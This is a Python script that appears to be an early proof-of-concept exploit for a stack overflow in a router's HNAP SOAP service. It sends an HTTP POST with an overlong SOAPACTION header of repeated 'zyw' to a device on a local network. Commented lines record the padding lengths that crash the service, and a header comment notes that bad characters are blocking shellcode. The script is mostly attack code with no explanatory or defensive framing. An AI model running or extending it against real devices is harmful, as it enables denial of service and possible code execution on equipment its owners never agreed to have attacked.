import socket
import struct


'''
4138 + XXXX in SoapAction value, right now only working with Exit address as sleep address has bad chars which 

disallows from using regular shellcode directly
'''
#data="<?xml version='1.0' encoding=\"UTF-8\"?>\r\n"
#data+="<SOAP-ENV:Envelope>\r\n"
#data+="	SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n"
#data+="	xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"\r\n"
#data+="	xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n"
#data+=">\r\n"
#data+="<SOAP-ENV:Body>\r\n"
#data+="<ns1:action xmlns:ns1=\"urn:schemas-upnp-org:service:WANIPConnection:1\" SOAP-ENC:root=\"1\">\r\n"
#data+="</ns1:action>\r\n"
#data+="</SOAP-ENV:Body>\r\n"
#data+="</SOAP-ENV:Envelope>\r\n"
data="aaaaa" #test
#data="aaaaaAAAA" #crash

buf = "POST / HTTP/1.1\r\n"
buf+="Accept-Encoding: gzip,deflate,sdch" +"\r\n"
buf+= "Host: 10.0.0.90\r\n"
buf+="SOAPACTION:"+"zyw"*111+"\r\n" #test
#buf+="SOAPACTION:http://purenetworks.com/HNAP1/GetDeviceSettings/"+"zyw"*339+"\r\n" #crash 338(1014) not crash 
#buf+="zywnothing"*210+"\r\n"
buf+="Content-Length: 13\r\n\r\n"+data+"\r\n\r\n"
'''
buf+="Proxy-Connection: keep-alive\r\n"
buf+="Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\r\n"
buf+="Cache-Control: max-age=0\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buf+="User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36\r\n"
buf+="Accept-Encoding: gzip,deflate,sdch" + "zyw"*400 +"\r\n"
buf+="Accept-Language: en-US,en;q=0.8\r\n"
buf+="Cookie: uid:1111;\r\n"


'''
print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.10.1", 65535))
s.send(buf)